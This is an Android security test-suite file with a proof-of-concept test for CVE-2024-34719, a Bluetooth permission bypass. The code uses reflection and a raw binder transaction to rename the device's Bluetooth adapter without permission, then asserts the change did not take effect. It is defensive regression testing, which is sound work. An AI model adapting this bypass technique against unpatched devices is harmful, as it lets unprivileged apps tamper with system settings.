/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import static androidx.test.core.app.ApplicationProvider.getApplicationContext;

import static com.android.compatibility.common.util.ShellUtils.runShellCommand;
import static com.android.sts.common.SystemUtil.poll;

import static com.google.common.truth.Truth.assertWithMessage;
import static com.google.common.truth.TruthJUnit.assume;

import static org.junit.Assume.assumeNoException;

import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.platform.test.annotations.AsbSecurityTest;
import android.service.media.MediaBrowserService;

import androidx.test.runner.AndroidJUnit4;

import com.android.sts.common.util.StsExtraBusinessLogicTestCase;

import org.junit.Test;
import org.junit.runner.RunWith;

import java.lang.reflect.Field;
import java.util.List;

@RunWith(AndroidJUnit4.class)
public class CVE_2024_34719 extends StsExtraBusinessLogicTestCase {

    @Test
    @AsbSecurityTest(cveBugId = 242996380)
    public void testPocCVE_2024_34719() {
        Parcel data = null;
        Parcel reply = null;

        // Start 'Bluetooth' process and store default 'Bluetooth' name
        try (AutoCloseable withBluetoothEnabled = withBluetoothEnabled();
                AutoCloseable withDefaultBluetoothName = withDefaultBluetoothName()) {
            // 'Bluetooth' service takes some time to get enabled
            // Wait until 'Bluetooth' service gets enabled and fetch its instance
            final BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            final Field bluetoothService = BluetoothAdapter.class.getDeclaredField("mService");
            bluetoothService.setAccessible(true);
            assume().withMessage("Unable to get running instance of 'Bluetooth' service")
                    .that(
                            poll(
                                    () -> {
                                        try {
                                            return bluetoothService.get(bluetoothAdapter) != null;
                                        } catch (Exception ignore) {
                                            // Ignore unintended exceptions
                                        }
                                        return false;
                                    }))
                    .isTrue();

            // Create parcels required to invoke the 'transact()' method of 'IBinder'
            data = Parcel.obtain();
            reply = Parcel.obtain();
            final IBinder binder = ((IInterface) bluetoothService.get(bluetoothAdapter)).asBinder();
            final String vulnerableDeviceName = "CVE_2024_34719_device_name";
            data.writeInterfaceToken(binder.getInterfaceDescriptor());
            data.writeString(vulnerableDeviceName);
            data.writeInt(0);
            data.setDataPosition(0);

            // Invokes 'transact()' of 'IBinder', which internally invokes vulnerable method
            final Context context = getApplicationContext();
            final Field transactionSetNameField =
                    context.createPackageContext(
                                    queryBluetoothPackageName(context),
                                    Context.CONTEXT_IGNORE_SECURITY)
                            .getClassLoader()
                            .loadClass("android.bluetooth.IBluetooth$Stub")
                            .getDeclaredField("TRANSACTION_setName");
            transactionSetNameField.setAccessible(true);
            final int transactionCode = transactionSetNameField.getInt(null);
            binder.transact(transactionCode /* code */, data, reply, 0 /* flags */);

            // Without fix, 'bluetooth_name' sets to 'vulnerableDeviceName'
            assertWithMessage(
                            "Device is vulnerable to b/242996380 !! Bluetooth - Permission"
                                    + " bypasses to multiple methods")
                    .that(
                            // Without fix, 'bluetooth_name' takes some time to get updated
                            poll(
                                    () ->
                                            runShellCommand("settings get secure bluetooth_name")
                                                    .contains(vulnerableDeviceName)))
                    .isFalse();
        } catch (Exception e) {
            assumeNoException(e);
        } finally {
            try {
                // Put a parcel object back into the pool
                data.recycle();
                reply.recycle();
            } catch (Exception ignore) {
                // Ignore unintended exceptions
            }
        }
    }

    private AutoCloseable withBluetoothEnabled() {
        // Check if 'Bluetooth' is already enabled
        if (runShellCommand("settings get global bluetooth_on").contains("1")) {
            return () -> {};
        }

        // Enable 'Bluetooth'
        runShellCommand("svc bluetooth enable");

        // Return AutoCloseable to disable 'Bluetooth'
        return () -> runShellCommand("svc bluetooth disable");
    }

    private AutoCloseable withDefaultBluetoothName() {
        // Store default 'Bluetooth' name
        final String defaultBluetoothName = runShellCommand("settings get secure bluetooth_name");

        // Return AutoCloseable to set default 'Bluetooth' name
        return () ->
                runShellCommand(
                        String.format(
                                "settings put secure bluetooth_name %s", defaultBluetoothName));
    }

    private String queryBluetoothPackageName(Context context) {
        List<ResolveInfo> resolveInfos =
                context.getPackageManager()
                        .queryIntentServices(
                                new Intent(MediaBrowserService.SERVICE_INTERFACE), 0 /* flags */);
        return resolveInfos.stream()
                .map(resolveInfo -> resolveInfo.serviceInfo)
                .map(serviceInfo -> serviceInfo.packageName)
                .filter(packageName -> packageName.contains("bluetooth"))
                .findFirst()
                .orElse("com.android.bluetooth");
    }
}
